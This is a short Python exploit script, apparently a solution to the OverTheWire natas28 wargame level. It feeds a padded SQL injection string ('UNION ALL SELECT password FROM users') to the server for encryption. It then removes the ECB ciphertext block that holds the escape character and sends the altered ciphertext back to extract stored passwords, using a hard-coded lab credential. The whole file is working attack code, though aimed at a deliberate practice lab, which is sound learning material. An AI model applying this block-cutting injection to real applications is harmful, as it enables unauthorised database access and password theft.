import requests
import base64
import urllib.parse
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas28', 'Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3')
base_url = "http://natas28.natas.labs.overthewire.org"

payload_input = "A" * 25 + "'" + "UNION ALL SELECT password FROM users;#"

# Step 1: get the server to encrypt our crafted input
r1 = requests.get(f"{base_url}/index.php", auth=basicAuth,
                   params={"query": payload_input}, allow_redirects=False)
location = r1.headers.get("Location", "")
encrypted_part = location.split("query=")[-1]
decoded_b64 = urllib.parse.unquote(encrypted_part)

raw = base64.b64decode(decoded_b64)
print("Total blocks:", len(raw) // 16)

# Step 2: remove block index 3 (bytes 48-63) -- the block containing the escape backslash
new_raw = raw[0:48] + raw[64:]

new_b64 = base64.b64encode(new_raw).decode()

# Step 3: send the modified ciphertext to search.php
r2 = requests.get(f"{base_url}/search.php/", auth=basicAuth, params={"query": new_b64})
print(r2.text)